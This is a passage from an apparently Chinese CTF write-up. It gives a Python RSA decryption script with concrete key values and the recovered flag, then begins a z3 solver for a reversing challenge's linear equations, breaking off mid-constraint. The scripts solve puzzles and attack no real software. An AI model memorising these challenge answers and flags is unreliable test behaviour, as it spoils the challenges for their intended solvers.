class="line-number">139</span><br><span class="line-number">140</span><br><span class="line-number">141</span><br><span class="line-number">142</span><br><span class="line-number">143</span><br><span class="line-number">144</span><br><span class="line-number">145</span><br><span class="line-number">146</span><br><span class="line-number">147</span><br><span class="line-number">148</span><br><span class="line-number">149</span><br><span class="line-number">150</span><br><span class="line-number">151</span><br><span class="line-number">152</span><br><span class="line-number">153</span><br><span class="line-number">154</span><br><span class="line-number">155</span><br><span class="line-number">156</span><br><span class="line-number">157</span><br><span class="line-number">158</span><br><span class="line-number">159</span><br><span class="line-number">160</span><br><span class="line-number">161</span><br><span class="line-number">162</span><br><span class="line-number">163</span><br><span class="line-number">164</span><br><span class="line-number">165</span><br><span class="line-number">166</span><br><span class="line-number">167</span><br><span class="line-number">168</span><br><span class="line-number">169</span><br></div></div><p>求出<code>d</code>的值，使用下列脚本解密flag：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
d <span class="token operator">=</span> <span class="token number">1485313191830359055093545745451584299495272920840463008756233</span>
c <span class="token operator">=</span> <span class="token number">37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066</span>
n <span class="token operator">=</span> <span class="token number">86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><code>flag{d3752538-90d0-c373-cfef-9247d3e16848}</code></p> <h2 id="rev"><a href="#rev" class="header-anchor">#</a> rev</h2> <h3 id="z3"><a href="#z3" class="header-anchor">#</a> z3</h3> <p>主函数F5，扑面而来的线性方程组。往常都是转成matlab代码交给在线IDE跑的，这次正好借机学一学z3怎么用。脚本如下：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>

<span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>

dst <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">20247</span><span class="token punctuation">,</span> <span class="token number">40182</span><span class="token punctuation">,</span> <span class="token number">36315</span><span class="token punctuation">,</span> <span class="token number">36518</span><span class="token punctuation">,</span> <span class="token number">26921</span><span class="token punctuation">,</span> <span class="token number">39185</span><span class="token punctuation">,</span> <span class="token number">16546</span><span class="token punctuation">,</span> <span class="token number">12094</span><span class="token punctuation">,</span> <span class="token number">25270</span><span class="token punctuation">,</span> <span class="token number">19330</span><span class="token punctuation">,</span>
    <span class="token number">18540</span><span class="token punctuation">,</span> <span class="token number">16386</span><span class="token punctuation">,</span> <span class="token number">21207</span><span class="token punctuation">,</span> <span class="token number">11759</span><span class="token punctuation">,</span> <span class="token number">10460</span><span class="token punctuation">,</span> <span class="token number">25613</span><span class="token punctuation">,</span> <span class="token number">21135</span><span class="token punctuation">,</span> <span class="token number">24891</span><span class="token punctuation">,</span> <span class="token number">18305</span><span class="token punctuation">,</span> <span class="token number">27415</span><span class="token punctuation">,</span>
    <span class="token number">12855</span><span class="token punctuation">,</span> <span class="token number">10899</span><span class="token punctuation">,</span> <span class="token number">24927</span><span class="token punctuation">,</span> <span class="token number">20670</span><span class="token punctuation">,</span> <span class="token number">22926</span><span class="token punctuation">,</span> <span class="token number">18006</span><span class="token punctuation">,</span> <span class="token number">23345</span><span class="token punctuation">,</span> <span class="token number">12602</span><span class="token punctuation">,</span> <span class="token number">12304</span><span class="token punctuation">,</span> <span class="token number">26622</span><span class="token punctuation">,</span>
    <span class="token number">19807</span><span class="token punctuation">,</span> <span class="token number">22747</span><span class="token punctuation">,</span> <span class="token number">14233</span><span class="token punctuation">,</span> <span class="token number">24736</span><span class="token punctuation">,</span> <span class="token number">10064</span><span class="token punctuation">,</span> <span class="token number">14169</span><span class="token punctuation">,</span> <span class="token number">35155</span><span class="token punctuation">,</span> <span class="token number">28962</span><span class="token punctuation">,</span> <span class="token number">33273</span><span class="token punctuation">,</span> <span class="token number">21796</span><span class="token punctuation">,</span>
    <span class="token number">35185</span><span class="token punctuation">,</span> <span class="token number">14877</span>
<span class="token punctuation">]</span>

v5 <span class="token operator">=</span> <span class="token punctuation">[</span>Int<span class="token punctuation">(</span><span class="token string">'v5_%d'</span> <span class="token operator">%</span> i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

sol <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">34</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> v5<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">27</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">24</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">78</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">48</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">15</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">26</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">34</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> v5<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">27</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">24</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">78</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">48</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">15</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">26</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">34</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">+</span> v5<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">27</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">24</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">78</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">48</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">15</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sol<span class="token punctuation">.</span>add<span class="token punctuation">(</span>dst<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">26</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> v5<span class="token punctuation">[</span><span 